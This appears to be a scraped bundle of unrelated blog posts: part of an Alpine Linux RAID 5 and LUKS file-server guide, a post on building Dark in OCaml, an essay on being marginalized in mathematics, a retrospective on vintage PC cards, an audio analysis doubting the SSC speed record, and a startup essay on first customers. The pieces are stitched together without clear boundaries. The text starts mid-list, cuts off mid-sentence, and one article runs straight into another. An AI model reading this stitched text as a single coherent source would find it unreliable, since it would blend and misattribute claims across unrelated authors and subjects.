[your password] -&gt; enter
[password again] -&gt; enter
[your timezone] Europe/Vienna -&gt; enter
[none] -&gt; enter
[chrony] -&gt; enter
[1] -&gt; enter
[openssh] -&gt; enter
Which disks would you like to use: none -&gt; enter
Enter where to store configs: usb -&gt; enter
[/media/usb/cache] -&gt; enter
(ignore the last warning)</code></pre>
<p>Now you have successfully configured your image! To save changes you made to the system write .</p>
<p><code>lbu commit -d</code></p>
<p>To be able to connect to alpine from the network we need to either set up SSH to allow root logins (by editing <code>/etc/ssh/sshd_config</code> and setting <code>PermitRootLogin</code> to <code>yes</code>) or by adding your ssh keys to the authorized_keys file.</p>
<pre><code>ssh-keygen # press enter until it's done
nano .ssh/authorized_keys # and add your SSH public keys in here
lbu include /root/.ssh # we need to tell alpine that we want to include the .ssh folder to the saved config on the USB
lbu commit -d # and saving to USB</code></pre>
<p>You always need to run <code>lbu commit -d</code> after you changed any config file or installed a program otherwise it will be lost on reboot. To see which files are included run <code>lbu ls</code></p>
<p>The idea for this is that the USB has all the programs and config but all data is stored on the mounted drives.</p>
<p>To confirm it really works, reboot the system and boot from the same USB again. If it needs your new password at login everything worked.</p>
<p>Now it can be plugged into the file server and booted. If you already have other disks in your server, make sure it's set to boot from USB. For my Data Vault I didn't have to (or would have been able to) change anything in the BIOS because if it can't find a boot partition on any disk, it will go straight to USB boot. Neat!</p>
<p>If you didn't set a fixed IP address then you'll have to do a lan scan</p>
<hr>


<p>I did all the dirty benchmarking for you already. Here it is</p>
<figure><a href="https://pictshare.net/8l2o1b.png"><img loading="lazy" src="https://pictshare.net/8l2o1b.png"><figcaption>Graph that shows how slow/fast different disk configurations are. I have no idea what happend to the RAID 5 read speeds, they don't even match RAID0</figcaption></a></figure>
<p>Now that we have our system up and running it's time to add the drives and use them. But first let's install a few things that will make our lives easier.</p>
<p><code>apk add nano htop lsblk e2fsprogs</code></p>
<p>Let's look at the disk configuration we have: <code>lsblk | grep disk</code></p>
<figure><img loading="lazy" src="https://pictshare.net/x7l1qa.png"><figcaption>All disks that have been found. Data disks from sda to sdd</figcaption></figure>
<p>Awesome so we have 3x3TB and 1x 2.5TB disks (I'll change the smaller one when my new 3TB gets here)</p>
<p>From here it's basically a "choose your own adventure" thing. We have 4 drives so we can set them up in different ways.</p>
<p>My choice is: RAID 5 using <code>mdadm</code> and over the combined storage LUKS encryption. If you feel you won't need encryption you can just skip it. If your CPU is as old as mine and doesn't have the aes-ni extension, encryption will probably be bottlenecking file transfers but personally I just can't say no to an encrypted homelab.</p>
<h2>Side note: ZFS</h2>
<p>Alpine Linux fully supports ZFS. You can read <a href="https://wiki.alpinelinux.org/wiki/Setting_up_ZFS_on_LUKS">this guide</a> how to use it even with encryption on Alpine. Since ZFS requires a bit more CPU than mdadm I'll be using the latter but on my main file server at home I'm using ZFS as well.</p>
<h2>Settung up RAID 5</h2>
<p>First we'll going to need <code>mdadm</code>,  we can install it using <code>apk add mdadm</code></p>
<p>Then we`ll have to make sure it runs on boot using</p>
<pre><code>rc-update add mdadm boot
rc-update add mdadm-raid boot</code></pre>
<p>Let's create or RAID!</p>
<pre><code>mdadm --create /dev/md0 --level=5 --raid-devices=4 /dev/sda /dev/sdb /dev/sdc /dev/sdd</code></pre>
<p>Depending on your hardware and disk size it might take pretty long for the RAID to sync so you can watch it using <code>watch cat /proc/mdstat</code></p>
<figure><img loading="lazy" src="https://pictshare.net/va1pwf.png"><figcaption>Watching the raid getting made</figcaption></figure>
<p>After it's finished, we can save the raid configuration info using <code>mdadm --examine --scan &gt; /etc/mdadm.conf</code> and don't forget to <code>lbu commit -d</code> after doing so.</p>
<p>Ok so now you have to choose</p>
<h3>a) No encryption</h3>
<p>If you don't need encryption then you're almost done.</p>
<p>First we need to give the RAID device (<code>/dev/md0</code>) a file system and then mount it.</p>
<pre><code>mkfs.ext4 /dev/md0
mount -t ext4 /dev/md0 /mnt</code></pre>
<p>At this stage you should see the disk array when running <code>df -h</code>. Congratulations if you made it this far!</p>
<p>To automate mount on boot add the following to your <code>/etc/fstab</code></p>
<pre><code>/dev/md0    /mnt    ext4    rw  0   0</code></pre>
<h3>b) Using LUKS disk encryption</h3>
<p>For testing purposes I'll be using a password for encryption but if you want your server to automatically unlock after boot, see this post I wrote about the subject: <a href="https://blog.haschek.at/2020/the-encrypted-homelab.html">The encrypted homelab</a></p>
<p><code>openssl rand 512 | base64 -w 0 | tr -cd '[:alnum:]._-' | head -c 64</code></p>
<figure><img loading="lazy" src="https://pictshare.net/11ukk1.png"><figcaption>This should spit out a good password for us to use but you can use your own if you like</figcaption></figure>
<p>Now that we have our password, we encrypt the raid device</p>
<pre><code>cryptsetup -v -c serpent-xts-plain64 -s 512 --hash sha256 luksFormat /dev/md0</code></pre>
<p>Then we'll have to unlock it (after every boot too, see <a href="https://blog.haschek.at/2020/the-encrypted-homelab.html">my other post</a> on how to automate it)</p>
<pre><code>cryptsetup open /dev/md0 data</code></pre>
<p>The second parameter is now used as our new block device we can use. It creates <code>/dev/mapper/data</code> and we can now use it as if it were a normal hard disk.</p>
<p>So let's first give it a file system and then mount it</p>
<pre><code>mkfs.ext4 /dev/mapper/data
mount -t ext4 /dev/mapper/data /mnt</code></pre>
<p>Now you should see your fully encrypted data drive on <code>/mnt</code> (use <code>df -h</code> to check if it's mounted). Since you have to encrypt it before you can mount it, we can't add it to <code>/etc/fstab</code> but in <a href="https://blog.haschek.at/2020/the-encrypted-homelab.html">my other post</a> I explain how it can still be automated on boot.</p>
<hr>


<p>We're going with the obvious solution here: Samba. That's linux powered windows shares which can be accessed by basically all operating systems.</p>

                <div>
                    <p><em>Part of a 3 part series. Followups on <a href="https://blog.darklang.com/new-backend-fsharp/">F#</a>, <a href="https://blog.darklang.com/why-dark-didnt-choose-rust/">Rust</a></em></p><p>I built the first demo of Dark in Python, in about two weeks. A few months later when I started productizing it, I rebuilt it in OCaml. Back in 2017, when I was considering the language and platform to use for Dark, OCaml was extremely compelling:</p><ul><li>it's a high-level language with static types, so easy to make large scale changes as we figure out what the language/product was</li><li>you mostly model data with sum types, which in my mind are the best way to model data</li><li>it's very similar to the language I wanted to build (in particular, we could reuse built-in immutable data structures for Dark's values)</li><li>it had a reputation for being high-performance, which meant that we could write an interpreter for Dark and not have it be terribly slow (vs writing an interpreter in python, which might be too slow)</li></ul><p>Unfortunately, as we've built Dark we've run into significant problems that have made it challenging to build in OCaml.</p><h2 id="lack-of-libraries">Lack of libraries</h2><p>When you bet on an off-mainstream language, one of the things you accept is that many libraries are not going to be available. When there is a small community, often there aren't enough people working in the language to make important libraries. This is especially true if few people are building business applications.</p><p>In OCaml there are many high quality libraries, especially for data structures and data manipulation. The annual<a href="https://opensource.janestreet.com/core/"> Jane Street code dump</a> has been quite useful and very high quality. However, we really felt the lack of several libraries. The most obvious of these is that we had to build a <a href="https://github.com/darklang/dark/blob/main/backend/libexecution/unicode_string.mli">Unicode string library</a> ourselves (built on top of the <a href="https://erratique.ch/software/uuseg">very impressive OCaml Unicode libraries</a> built by <a href="https://erratique.ch/contact.en">Daniel Bünzli</a>), but we needed many more libraries than that.</p><p>The lack of an SDK for Google Cloud has affected us greatly. When you're searching for product-market fit, you do the simplest, easiest thing. If you lack a good SDK for your cloud provider, the simplest, easiest thing is often a terrible architectural choice. We've built our own queue on top of our database rather than using the production-quality cloud queues available on GCP. Similarly, we barely use the Cloud Storage (GCP's version of S3), because we initially put things in the database <a href="https://blog.darklang.com/evolving-darks-tracing-system/">because it was easier</a>. We've built 3 services, 2 <a href="https://github.com/darklang/dark/tree/main/containers/stroller">in</a> <a href="https://github.com/darklang/dark/tree/main/containers/queue-scheduler">Rust</a>, and 1 in <a href="https://github.com/darklang/dark/tree/main/containers/postgres-honeytail">Go</a>, to workaround the challenges we've faced.</p><p>The biggest challenge here is our use of Postgres. Postgres is a great database and we're big fans, but Cloud SQL is not a great hosted database. GCP's position is that Cloud SQL is there to tick a box and we should be using Cloud Spanner. I would love to switch to Cloud Spanner, but we have no driver for it in OCaml. Given the Postgres driver in OCaml is not particularly mature, it's hard to expect that a Cloud Spanner driver would exist, and indeed it doesn't. We've had to contribute to the <a href="https://github.com/mmottl/postgresql-ocaml/commit/81a4ae5240decd8f483a90568257cfbc1558c7ed">OCaml Postgres driver</a>, and some parts of our codebase have been <a href="https://github.com/darklang/dark/blob/main/backend/libbackend/serialize.ml#L226">well and truly mangled</a> when working around features not supported in that driver.</p><p>We've also suffered from a lack of a high-level, production web stack (there are <a href="https://github.com/anmonteiro/ocaml-h2">low-level stacks with good reputations</a> that I've struggled to use, and a <a href="https://github.com/oxidizing/sihl">few</a> <a href="https://github.com/reason-native-web/morph">new</a> ones out there that look good), in particular lacking a user authentication module. We've been using <a href="https://auth0.com/">Auth0</a> to work around this for now, which has more moving pieces than I'd like, and a shockingly high cost (our 7000 users, most of whom never log in, costs us over $500/mo).</p><p>We've worked around other missing vendor SDKs by calling their HTTP endpoints directly and that's been mostly fine. However, for libraries like encryption we don't have that option - we <a href="https://github.com/darklang/dark/pull/1455/files">hacked around a missing encryption library</a>, but decided not to ship it to production until we audited it for security (which was never actually worth the cost).</p><p>At CircleCI, we bet on Clojure. That was also a non-mainstream language, but its ability to call Java SDKs meant we had a mature cloud library, which was essential for building CircleCI. Of course, in OCaml we could call C libraries (and <a href="https://github.com/darklang/dark/pull/1841">even Rust libraries</a>, perhaps), but it doesn't match having native libraries we can call directly.</p><h2 id="learnability">Learnability</h2><p>I'm mostly in the camp that anyone can learn any language, but I saw a team struggle with OCaml, and for good reason. Language tutorials are extremely poor in OCaml compared to other languages; they're mostly lecture notes from academic courses.</p><p>The compiler isn't particularly helpful, certainly compared to Rust or Elm (both of which have been in our stack at one point). Often it gives no information about an error. Syntax errors typically say "Syntax error"; though it will try to give a good error for a mismatched brace, often incorrectly. Type errors can be a real burden to read, even after 3 years of experience with it.</p><p>The docs in OCaml are often challenging to find. The <a href="https://ocaml.janestreet.com/ocaml-core/latest/doc/base/index.html">Jane Street docs</a> have improved significantly in the last few years, but it can be a challenge to even figure out what functions are available in a particular module for most libraries. Compare to the excellent <a href="https://docs.rs/">docs.rs</a> in Rust, which has comprehensive API docs for every package in Rust.</p><p>One of the ways I personally struggled in OCaml is around <code>Lwt</code>. Lwt is (one of!) OCaml's async implementations. I couldn't figure it out several years ago and so just built a single-threaded server. The amount of workarounds and downtime we've suffered from that single decision is immense. A tutorial around building high-performance (or even medium performance!) web servers would be very valuable. </p><p>Tooling is something I read would be good in OCaml. I remember reading there was a debugger that could go back in time! I don't know where that's gone but I've never heard of anyone using it.</p><p>We have struggled to make editor tooling work for us. This is partially because we also use ReasonML and this seems to break things. Unfortunately, this is common in programming, but even more so in small communities: you might be the first person to ever try to use a particular configuration.</p><p>Finally, the disconnect between the various tools is immense. You need to understand Opam, Dune, and Esy, to be able to get something working (you could also do it without Esy and just rely on Opam, but that's much worse). I talked about a bunch of these challenges <a href="https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/">here</a>.</p><h2 id="language-problems">Language problems</h2><p>Multicore is coming Any Day Now™️, and while this wasn't a huge deal for us, it was annoying. </p><h2 id="minor-annoyances">Minor annoyances</h2><p>One of my biggest annoyances was how often OCaml folks talk about Fancy Type System problems, instead of how to actually build products and applications. In other communities for similar languages (ReasonML, Elm, F#), people talk about building apps and solving their problems. In OCaml, it feels like people spend an awful lot of time discussing Functors. It's not quite at the level that I perceived in the Haskell world, but it pointed out that the people building the core of the ecosystem do not have the same problems that I do (which is building web-y stuff).</p><p>I honestly think OCaml was a great choice at the start. Being able to quickly and safely make large-scale changes to your app is something that staticly-typed functional languages excel at. I'm happy that we made the choice, and in retrospect, it still seems like the best choice of those we had at the time.</p><p>I'm working on building the next version of the backend. We have about 20k lines to be replaced, and they'll be rewritten in a new language while keeping the semantics the same. I plan to leave keep the frontend in ReasonML: it doesn't suffer from the same library problems as it can interface nicely to JS, and it's nearly 50k lines of code so it would be a much bigger undertaking.</p><p>Read <a href="https://blog.darklang.com/new-backend-fsharp/">the followup</a> to see what we picked!</p><hr><p><em><em><em><em><em><em><em><em>You can sign up for Dark </em></em></em></em></em></em></em></em><a href="https://darklang.com/signup" rel="noopener nofollow"><em><em><em><em><em><em><em><em>here</em></em></em></em></em></em></em></em></a><em><em><em><em><em><em><em><em>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>As a rule, I do not discuss math with mathematicians if I can at all avoid it. I would like to tell you why, but it’s complicated. You can never make assumptions about a marginalized person’s character based solely on behavior. Oppression creates behaviors that wouldn’t otherwise be there, and if you are not going through the same oppression, you can’t know how you would behave. People have made a lot of assumptions about me because of my actions with respect to math.</p>
<p>I must not like math. I must not like math enough. I don’t find math research interesting. Maybe I should be doing something else. It’s okay if it’s just too hard. It’s okay if academia is not for me. If I really want to make a difference, I should work for NSF.</p>
<p>When you give off the impression of struggle people really expect you to Totally Understand Yourself And Your Motivations And Precisely What You Want Out Of Every Experience. I know plenty of mathematicians who have waned in their desire to be in academia, but their presence was never scrutinized and their worth was always taken for granted.</p>
<p>I can count on zero hands the number of times I was asked “Tell me, who or what crushed your mathematical curiosity?” When I stopped talking about math, not a single friend said “Have I done something to make you uncomfortable talking with me?”&nbsp; Nobody questioned whether I felt safe asking questions. They just built up their assumptions and their judgments. It became a thing. That thing they knew about me, you know, how I don’t talk about math. Whatever my problem is.</p>
<p>I hated it, but even still, it was better than discussing math.</p>
<p>It’s not that my friends had terrible intentions. Nobody was mean to me, nobody consciously laughed at me. There’s just a way that mathematicians have been socialized (I guess?!) to interact with each other that I find oppressive. If you have never had someone mansplain or whitesplain things to you, it may be hard for you to understand what I’m going to describe.</p>
<p>Usually, friendly conversation involves building a shared perspective. Among other things, mansplaining and whitesplaining involve one person of privilege forcing a marginalized person into a disagreeable perspective against their will, and not allowing them a way out. If you are someone averse to negative labels, it can be silencing. My experience discussing math with mathematicians is that I get dragged into a perspective that includes a hierarchy of knowledge that says some information is trivial, some ideas are “stupid”; that declares what is basic knowledge, and presents open incredulity in the face of dissent. Maybe I would’ve successfully assimilated into this way of thinking if I had learned it at a time where I was at the same level as my peers, but as it was it was just an endless barrage of passive insults I was supposed to be in on.</p>
<p>I got used to bracing myself. I got used to analyzing my self-consciousness. I prepared for every meeting with my advisor with a list of pre-approved mathematically sound sentences and questions. I got used to explaining that I wasn’t fluent in math. That I was different from everyone else. I let them win, because the alternative was too big an emotional sacrifice.</p>
<p>In preparation for my defense, I gave a talk in a friend’s class to a group of graduate students. It was my first ever math talk. At one point, my friend asked a fairly simple question about what I’d said (based on something she’d misheard) and the foundations of all my knowledge shattered and I was basically like “Maybe everything I’m doing is wrong and/or illegal, I don’t know.” Did that happen because it’s an essential part of my personality that would be with me no matter what? Did it happen because I’m a woman who was raised as a girl in a misogynistic society that expects women not to know things and to apologize for existing? Did it happen because I am a person of color who went to school with white people and learned that I don’t get to define my own experiences and my own knowledge? Did it happen because I learned that mathematicians believe some mistakes are morally reprehensible? I don’t know. I can’t know.</p>
<p>I can only wonder if there are people out there who think the way I think who are suffering in math or who got pushed out or never tried, and what a loss that is.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="lf-text">
            <p>Recently, I have been gathering some old hardware at my parents’
house, notably PC extension cards, as they don’t take much room and
can be converted to a nice display item. Unfortunately, I was not very
concerned about keeping stuff around. Compared to all the hardware I
have acquired over the years, only a few pieces remain.</p>

<p>This SVGA graphics card was installed into a PC powered by a 386SX CPU
running at 16 MHz. This was a good card at the time as it was pretty
fast. It didn’t feature 2D acceleration, unlike the later ET4000/W32.
This version only features 512 KB of RAM. It can display 1024×768
images with 16 colors or 800×600 with 256 colors. It was also
compatible with CGA, EGA, VGA, MDA, and Hercules modes. No
contemporary games were using the SVGA modes but the higher
resolutions were useful with Windows 3.</p>
<p>This card was manufactured directly by Tseng Labs.</p>
<figure><p><span><img alt="Carte Tseng Labs ET4000AX ISA au-dessus de la boîte &quot;Planète Aventure&quot;" src="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/et4000@1x.jpg" srcset="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/et4000@2x.jpg 2x" width="900" height="780" loading="lazy"></span></p><figcaption>Tseng Labs ET4000 AX ISA card</figcaption></figure>

<p>My first sound card was an AdLib. My parents bought it in Canada
during the summer holidays in 1992. It uses a Yamaha OPL2 chip to
produce sound via FM synthesis. The first game I have tried is
<a href="https://en.wikipedia.org/wiki/Indiana_Jones_and_the_Last_Crusade:_The_Graphic_Adventure" title="Indiana Jones and the Last Crusade: The Graphic Adventure on Wikipedia">Indiana Jones and the Last Crusade</a>.</p>
<p>I think I gave this AdLib to a friend once I upgraded my PC with a
Sound Blaster Pro 2. Recently, I needed one for a side project, but
they are rare and expensive on eBay. Someone mentioned a cheap clone
on <a href="https://www.vogons.org/viewtopic.php?t=73429" title="Sun Moon Star Adlib Clone">Vogons</a>, so I bought it. It was sold by Sun Moon Star in 1992
and shipped with a CD-ROM of Doom shareware.</p>
<figure><p><span><img alt="AdLib clone on top of &quot;Alone in the Dark&quot; box" src="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/adlib-clone@1x.jpg" srcset="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/adlib-clone@2x.jpg 2x" width="700" height="619" loading="lazy"></span></p><figcaption>AdLib clone ISA card by Sun Moon Star</figcaption></figure>

<p>Later, I switched the AdLib sound card with a Sound Blaster Pro 2. It
features an OPL3 chip and was also able to output digital samples. At
the time, this was a welcome addition, but not as important as the FM
synthesis introduced earlier by the AdLib.</p>
<figure><p><span><img alt="Sound Blaster Pro 2 on top of &quot;Day of the Tentacle&quot; box" src="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/sbpro@1x.jpg" srcset="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/sbpro@2x.jpg 2x" width="900" height="794" loading="lazy"></span></p><figcaption>Sound Blaster Pro 2 ISA card</figcaption></figure>

<p>I bought this card mostly for the serial port. I was using a 486DX2
running at 66 MHz with a Creatix LC 288 FC external modem. The serial
port was driven by an 8250 UART with no buffer. Thanks to
<a href="http://www.terminate.com/" title="Terminate, a DOS terminal program">Terminate</a>, I was able to connect to <a href="https://en.wikipedia.org/wiki/Bulletin_board_system" title="Bulletin board system on Wikipedia">BBSes</a> with DOS, but this
was not possible with Windows 3 or OS/2. I needed one of these fancy
new cards with a 16550 UART, featuring a 16-byte buffer. At the time,
this was quite difficult to find in France. During a holiday trip, I
convinced my parent to make a short detour from Los Angeles to San
Diego to buy this <em>Promise EIDE 2300 Plus</em> controller card at a shop I
located through an advertisement in a local magazine!</p>
<p>The card also features an EIDE controller with multi-word DMA mode 2
support. In contrast with the older PIO modes, the CPU didn’t have to
copy data from disk to memory.</p>
<figure><p><span><img alt="Promise EIDE 2300 Plus next to an OS/2 Warp CD" src="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/promise@1x.jpg" srcset="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/promise@2x.jpg 2x" width="900" height="694" loading="lazy"></span></p><figcaption>Promise EIDE 2300 Plus VLB card</figcaption></figure>

<p>The 3dfx Voodoo2 was one of the first add-in graphics cards
implementing hardware acceleration of 3D graphics. I bought it from a
friend along with his Pentium II box in 1999. It was a big
evolutionary step in PC gaming, as games became more beautiful and
fluid. A traditional video controller was still required for 2D. A
pass-through VGA cable daisy-chained the video controller to the
Voodoo, which was itself connected to the monitor.</p>
<figure><p><span><img alt="3dfx Voodoo 2 Magic 3D II on top of &quot;Jedi Knight: Dark Forces II&quot; box" src="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/3dfx@1x.jpg" srcset="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/3dfx@2x.jpg 2x" width="900" height="718" loading="lazy"></span></p><figcaption>3dfx Voodoo2 Magic 3D II PCI card</figcaption></figure>

<p>In the early 2000s, in college, the Internet connection on the campus
was provided by a <a href="https://web.archive.org/web/20020327172921/http://www.crans.org/" title="Cachan Réseau @ Normale Sup'">student association</a> through a  100 Mbps Ethernet
cable. If you wanted to reach the maximum speed, the <em>3Com
3C905C-TX-M</em> PCI network adapter, nicknamed “Tornado”, was the card
you needed. We would buy it second-hand by the dozen and sell them to
other students for around 30 €.</p>
<figure><p><span><img alt="3COM 3C905C-TX-M on top of &quot;Red Alert&quot; box" src="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/3com@1x.jpg" srcset="https://d1g3mdmxf8zbo9.cloudfront.net/images/pc-cards/3com@2x.jpg 2x" width="700" height="676" loading="lazy"></span></p><figcaption>3Com 3C905C-TX-M PCI card</figcaption></figure>        </div></div>]]>

November 2, 2020 | https://fungiboletus.github.io/ssc-rpm/ | <a href="https://web.archive.org/web/*/https://fungiboletus.github.io/ssc-rpm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  

  <p>A few days ago, the YouTube algorithm suggested to me and many other a BBC TopGear video about a new world record
    for the
    fastest <em>production</em> car.</p>

  <iframe width="560" height="315" src="https://www.youtube.com/embed/N22JfNHiC1k" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

  <p>SSC North America, a sports car manufacturer, claims in this video to have reached 532.8km/h with their latest car
    (331mph if you still didn't get the memo about the
    world using metric units). It's a single run and the video doesn't include the second run driving back to the
    starting point. A real speed record for cars is the mean of the two runs to take into account elevation changes and
    wind. Still, it's <em>a lot</em> faster than the previous official world record held by Bugatti on their dedicated
    track at
    431km/h, or the non-official world record of Koenigsegg at 447km/h.</p>

  <p>You can argue whether these cars are production cars, or the utility to drive at such high speeds when after each
    run of a few seconds you need to change the tires, the wheels, and sometimes the engine. You can also wonder why our
    societies still invest in fast supercars cars when they should prioritize low consumption electric cars. Or you can
    reflect on the point of building cars at all, shouldn't we bike and develop more public transports? I
    was impressed by this record. I like fast cars, I own a Bugatti Chiron in Lego.</p>

  <p>You may have guessed, the record is perhaps invalid. Many people did question the record, by computing the average
    speed on the road section shown on the video or doing the maths of the aerodynamics force involved at such extremely
    high speeds for example.</p>

  <p>Yesterday, Misha Charoudin who is a professional driver and a vlogger published a video of him and a friend
    discussing the record attempt with some technical details, such as the gearbox ratios and the wheels
    dimensions of the car. Using this information, I got the idea to try computing the maximum speed using an audio
    frequency spectrum analysis. The idea is to use the engine sound to guess the car real speed. Everything is
    connected, it should be straightforward.</p>

  <iframe width="560" height="315" src="https://www.youtube.com/embed/fSNRKBj_hUE" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

  <h3>Step 1: Download the record attempt video using youtube-dl.</h3>

  <p><code>youtube-dl --list-formats https://www.youtube.com/watch?v=N22JfNHiC1k</code></p>
  <p>I selected the format with the highest audio bitrate.</p>
  <p><code>youtube-dl --format 251 https://www.youtube.com/watch?v=N22JfNHiC1k</code></p>

  <h3>Step 2: Extract the audio from the video.</h3>

  <p>There is a ffmpeg command to extract the audio from the video, but I used VLC because I didn't feel like installing
    ffmpeg and searching for the right command. I exported to FLAC because it's a lossless format compatible with
    Audacity.</p>

  <img src="https://fungiboletus.github.io/ssc-rpm/vlc-convert.png" alt="Screenshot of VLC to convert the video to audio">

  <h3>Step 3: Loading the audio file in Audacity</h3>

  <img src="https://fungiboletus.github.io/ssc-rpm/audacity-load.png" alt="Screenshot of the audio file in Audacity">

  <p>The file is in stereo, but the analysis is simpler in mono. I used the "Split stereo to mono" option and deleted
    one of the track. It doesn't matter which one, but to be sure I tried both and I obtained the same final
    result.</p>

  <img src="https://fungiboletus.github.io/ssc-rpm/audacity-split.png" alt="Screenshot of the context menu to select split stereo to mono">

  <h3>Step 4: Setting up the spectrogram</h3>

  <p>I selected the spectrogram view, a very cool feature of Audacity.</p>
  <img src="https://fungiboletus.github.io/ssc-rpm/audacity-spectrogram.png" alt="Screenshot of the context menu to select the spectrogram view">
  <br>
  <img src="https://fungiboletus.github.io/ssc-rpm/spectrogram.png" alt="Spectrogram">

  <p>Nothing is very visible yet, it's mostly (wind) noise. So I tried a few settings and after some tries, I got
    something a lot more interesting. I used the highest window size and ignored the frequencies above 600Hz as I'm more
    interested in the main harmonic frequencies of the engine. I also resized the spectrogram view.</p>

  <img src="https://fungiboletus.github.io/ssc-rpm/spectrogram-settings.png" alt="Screenshot of the spectrogram view settings">
  <br>
  <img src="https://fungiboletus.github.io/ssc-rpm/nice-spectrogram.png" alt="A nicer spectrogram">

  <h3>Step 5: Analysing the spectrogram</h3>

  <p>The lines are harmonic frequencies of the car components, such as the gearbox, the engine, the wheels,
    etc. One line is particularly visible, and thanks to the gearshifts it's easy to guess that it's one harmonic
    related to the engine sound.</p>
  <img src="https://fungiboletus.github.io/ssc-rpm/spectrogram-explained.png" alt="An explained version of the spectrogram">

  <p>I then zoomed on the part when the car is the fastest in the video, and selected the audio where the harmonic is at
    its highest pitch. I then plotted the spectrum in the analyze menu, to have a more precise idea of the frequency.
    Finding out where is the corresponding peak in the chart is a bit difficult but it's for sure the one at 251Hz.</p>

  <img src="https://fungiboletus.github.io/ssc-rpm/audacity-selection.png" alt="Selection of the audio at the maximum speed">
  <br>
  <img src="https://fungiboletus.github.io/ssc-rpm/frequency-analysis.png" alt="Frequency analysis of the video sound at the maximum speed">

  <h3>Step 6: Computing the engine RPM</h3>

  <p>So after that, I knew that at the highest speed, my nice engine harmonic had a frequency of 251Hz. I only needed to
    figure out the formula to compute the RPM from this harmonic frequency. Thankfully, the video from Misha includes
    data with the engine RPM at two points in time. The dashboard is blurred in the YouTube video of record, I wonder
    why,
    but according to the Misha video SSC also published on Instagram videos with a not blurred dashboard,
    allowing them to know the RPM at two points in time.</p>

  <p>I also quickly searched the formula and found out it was something like
    <code>RPM = 60 * frequency * something</code>. The main thing is that we need to convert from Hz to RPM and it's
    linear.</p>

  <p>Using audacity I analyzed the frequencies of the same harmonic. I got 243Hz at 1m21, for about 7300rpm, and 189Hz
    at 1m37 for about 5400rpm. My formula was, therefore, <code>RPM = 30 * frequency</code>.</p>

  <p>Finally, to compute the engine RPM at the maximum speed, I multiplied the frequency of the harmonic by 30. So
    <code>251 * 30 = 7530 rpm</code>.</p>

  <h3>Step 7: Getting the final speed</h3>

  <p>Computing the car speed from the engine RPM is simple if you have the data, you know how fast the engine rotates
    and you need to know how fast the wheels rotate, and their size.</p>

  <p>Good news, SSC <a href="https://www.sscnorthamerica.com/news/jerod-shelby-explains-world-record">gave us the
      data.</a> We rear wheels had <code>89.125</code> inches of circumference, <code>2.263775</code> meters. The final
    drive ratio was <code>2.92</code> and the sixth gear, the one used for the record had a ratio of <code>0.757</code>.
  </p>

  <p>The gearbox ratios are different than in the Misha video. I think they didn't know SSC had used a specific gearbox.
    We got a final drive ratio of <code>3.167</code> and a sixth gear ratio of <code>0.784</code>.

  </p><p>Putting everything together, we have
    <code>speed = rear_wheel_circumference * rpm / 60 / final_drive_ratio / sixth_gear_ratio</code>.</p>

  <p>With SSC data, at <code>7530</code> rpm it means <code>128.5m/s</code> or <code>460.8km/h</code> or
    <code>286.3mph</code>. Still above the previous records.</p>
  <p>With Misha's video data, at <code>7530</code> rpm it means <code>114.4m/s</code> or <code>411.9km/h</code> or
    <code>255.9mph</code>.</p>

  <h3>Who is right?</h3>

  <p>SSC <a href="https://www.sscnorthamerica.com/news/jerod-shelby-explains-world-record">announced</a> that the engine
    was at <code>8600rpm</code> at the maximum speed, but I&nbsp;computed <code>7530rpm</code>. I may have used some wrong
    data
    when estimating the RPM, though I like the cleanness of my formula: <code>RPM = 30 * frequency</code>.</p>

And there is a good reason for that. Early employees aren't travelers, they are cartographers. </p><p>"<a href="http://paulgraham.com/ds.html">Do things that don't scale</a>" is Paul Graham's advice to founders and early employees...</p><blockquote><p>"<em>The most common unscalable thing founders have to do at the start is to recruit users manually. Nearly all startups have to. You can't wait for users to come to you. You have to go out and get them."</em></p></blockquote><p>and while I've always <em>believed</em> this, I didn’t really <em>understand</em>.</p><p>After all, the first customer is the least profitable! They take the most effort, the most attention, the most support, and the most duct tape of any customer to come! Hundreds of hours of founder and early employee work go into building for, earning, and keeping those first customers. Those customers are wildly unprofitable on a unit economic (CAC / LTV) basis, and an accounting basis... and quite possibly even a morale basis.</p><p>There is this moment, when you have a few early customers, and you are feeling bruised and battered and exhausted just from getting those few... that you wonder if this will ever get easier.</p><p>If you spend too much time imagining that all of the customers to come will be AS challenging, slow, and expensive as this first customer — “well, we may as well shut the company down right now.”</p><p>However.</p><p>The math that made me <em>understand</em> "Do things that don't scale" was when I stopped looking at Unit Economics and started looking at Enterprise Value—thinking like an Investor.</p><blockquote><p>"<em>I am a better investor because I am a businessman, and a better businessman because I am an investor." - Warren Buffett</em></p></blockquote><p>I heard <a href="https://www.youtube.com/watch?v=KL97y2Of3cA">Jason Calacanis on Shane Parrish's</a> podcast say a company goes from uninvestable to investable when they go from zero customers to one customer. </p><p>That's when "Do things that don't scale" clicked to me.</p><p>The <strong>projected enterprise value</strong> change when a company goes from 0 customers to 1 customer is... approaching an infinite % increase, because at 0 customers a company is by default worth $0.</p><p>When you don't have any customers, the thing that will add the most value to your business is adding your first customer.</p><p>When a young company adds one customer, they aren't just adding the LTV of that customer. They are also adding the likelihood of winning other customers with similar problems. They gain some incremental credibility, some incremental scale, and lessons to carry forward.</p><p><strong>Think about early sales’ impact on projected enterprise value</strong>, and it is clear winning and keeping customer one is a company's most important job. Your first customer may be worth millions of dollars to your enterprise value<strong>.</strong> It may take you from uninvestable to investable.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603888246335_87688"><div><p>I don't 